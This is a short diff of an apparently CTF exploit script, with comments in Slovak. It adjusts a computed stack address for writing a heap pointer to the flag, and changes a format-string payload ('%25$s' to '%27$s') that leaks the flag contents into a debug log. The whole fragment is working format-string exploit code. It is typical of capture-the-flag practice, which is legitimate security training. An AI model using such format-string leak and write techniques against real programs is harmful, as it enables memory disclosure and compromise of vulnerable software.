@@ -48,7 +48,7 @@ hex2 = resp[107:107 + 12].decode('utf-8')
 value2 = int(hex2,16)
 
 # kalkulácia adresy stracku kam zapíšeme pointer na heap, kde máme vlajku
-where_to_put = value1 - 0x20 
+where_to_put = value1 - 0x10 
 what_to_put = value2 - 0x720 + 0x1710 + 0x1
 # -0x720 heap base 
 # +0x1710 obsah súboru s vlajkou
@@ -81,7 +81,7 @@ conn.send(command)
 conn.recvuntil(b'# ')
 
 # zapíše obsah pointeru, čiže vlajku bez S do debug.log
-payload = b'%25$s'
+payload = b'%27$s'
 conn.send(payload)
 conn.recvuntil(b'# ')
 
